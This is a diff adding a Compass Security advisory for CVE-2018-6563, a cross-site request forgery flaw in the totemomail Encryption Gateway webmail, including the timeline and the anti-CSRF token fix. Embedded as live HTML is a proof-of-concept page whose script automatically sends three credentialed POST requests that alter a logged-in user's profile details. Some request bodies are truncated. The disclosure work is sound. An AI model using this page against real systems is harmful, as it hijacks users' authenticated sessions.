@@ -1,0 +1,144 @@
+<!--
+################################################################################
+#
+# COMPASS SECURITY ADVISORY
+# https://www.compass-security.com/research/advisories/
+#
+################################################################################
+#
+# Product:  totemomail Encryption Gateway
+# Vendor:   totemo AG
+# CSNC ID:  CSNC-2018-003
+# CVE ID:   CVE-2018-6563
+# Subject:  Cross-Site Request Forgery
+# Risk:     High
+# Effect:   Remotely exploitable
+# Author:   Nicolas Heiniger <nicolas.heiniger@compass-security.com>
+# Date:     14.05.2018
+#
+################################################################################
+
+Introduction:
+-------------
+The totemomail Encryption Gateway protects email communication with any external
+partner by encryption. It doesn't matter whether you exchange emails with
+technically savvy communication partners or with those who have neither an
+appropriate infrastructure nor the necessary know-how. The encryption gateway
+also makes it easy to securely send very large attachments.[1]
+
+Compass Security discovered a vulnerability in the webmail part of the
+solution. It is possible to predict all parameters that are required to
+execute actions on the webmail interface. This allows an attacker to perform
+Cross-Site Request Forgery (CSRF) attacks. The attacker needs to craft a malicious web
+page that will automatically send a request to the Encryption Gateway. If the
+user is logged in, the request will be executed by the Encryption Gateway on
+behalf of the logged in user. This could be used to change a user's settings, send emails or
+change contact informations.
+
+
+Affected:
+---------
+Vulnerable:
+ * 6.0.0_Build_371
+
+No other version was tested but is is likely that older versions are affected as
+well.
+
+
+Technical Description
+---------------------
+In the webmail, no anti-CSRF token is used. Although the viewState makes the
+attack more complex, it is possible to entirely predict the requests and thus,
+perform CSRF attacks. The requirement here is to perform the attack as a replay of a full
+user interaction. One has to replay every request to make sure that the viewState is
+updated on the server side and corresponds to the action that is performed by
+the malicious page.
+
+Such a malicious page is presented below, it will automatically send 3 requests
+that will change the user's detail:
+==========
+-->
+
+<html>
+  <body>
+    <script>
+      function submitRequest1()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https:\/\/[CUT BY COMPASS]\/responsiveUI\/webmail\/newMessage.xhtml", true);
+        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
+        xhr.withCredentials = true;
+        var body = "tabNavigationForm_SUBMIT=1&javax.faces.ViewState=An36[CUT BY COMPASS]XBJn&tabNavigationForm_j_id_24_j_id_26=tabNavigationForm$
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+      }
+
+      function submitRequest2()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https:\/\/[CUT BY COMPASS]\/responsiveUI\/accountOverview\/preferences.xhtml", true);
+        xhr.setRequestHeader("Accept", "application\/xml, text\/xml, *\/*; q=0.01");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded; charset=UTF-8");
+        xhr.withCredentials = true;
+        var body = "javax.faces.partial.ajax=true&javax.faces.source=preferencesForm_phoneNumber_input_text&javax.faces.partial.execute=preferencesForm_phoneNumber_input_tex$
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+      }
+
+      function submitRequest3()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https:\/\/[CUT BY COMPASS]\/responsiveUI\/accountOverview\/preferences.xhtml", true);
+        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
+        xhr.withCredentials = true;
+        var body = "preferencesForm_firstname_input_text=CSRF&preferencesForm_lastname_input_text=CSRF&preferencesForm_phoneNumber_input_text=%2B41+00+000+00+00&preferencesF$
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+      }
+
+      submitRequest1();
+      submitRequest2();
+      submitRequest3();
+    </script>
+  </body>
+</html>
+
+<!--
+==========
+
+
+Workaround / Fix:
+-----------------
+Install an up to date version of totemomail Encryption Gateway.
+
+As a developer, the requests that execute actions must include an unpredictable
+element. This is usually done by using an anti-CSRF token. This token is a
+random value tied to the user's session and must be verified by the server
+before executing any action on behalf of the user.
+
+
+Timeline:
+---------
+2018-05-14:     Coordinated public disclosure date
+2018-03-XX:     Release of fixed version 6.0_b511
+2018-02-13:     Initial vendor response
+2018-02-09:     Initial vendor notification
+2018-02-02:     Assigned CVE-2018-6563
+2018-01-11:     Discovery by Nicolas Heiniger
+
+
+References:
+-----------
+[1] https://www.totemo.com/en/solutions/email-encryption/external-encryption
+-->
